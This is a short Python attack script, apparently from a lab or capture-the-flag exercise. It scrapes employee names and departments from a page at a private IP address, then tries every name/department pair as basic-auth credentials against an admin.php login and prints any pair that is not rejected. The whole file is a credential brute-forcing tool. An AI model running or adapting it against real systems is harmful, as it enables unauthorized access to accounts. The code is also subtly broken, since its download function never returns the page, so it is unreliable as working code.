import base64
import http.client
import requests

from bs4 import BeautifulSoup as bs4
from requests.models import Response

# Function Making!!!!

def downloadpage(url):  #Function to get the content of the URL
    res=requests.get(url)
    response=res.content

def findNames(response):    #Function to extract Names in Webpage content
    parser=bs4(response,'html.parser')
    names=parser.find_all('td',id='name')
    output=[]
    for name in names:
        output.append(name.text)
    return output

def findDepts(response):    #Function to extract Departments in Webpage content
    parser=bs4(response,'html.parser')
    names=parser.find_all('td',id='department')
    output=[]
    for name in names:
        output.append(name.text)
    return output

def getAuthorized(url,username,password):
    res=requests.get(url,auth=(username,password))
    if str(res.status_code) !='401':
        print("\n[!] Username:"+ username + "Password:" + password + "Code:" + str(res.status_code) + "\n")

# Main Program Starts Here!!!!

page=downloadpage("http://172.16.120.120")

names=findNames(page)
uniqnames=sorted(set(names))

department=findDepts(page)
uniqdepts=sorted(set(department))

print("[+] Working...")
for nam in uniqnames:
    for dept in uniqdepts:
        

        getAuthorized("http://172.16.120.120/admin.php",nam,dept)

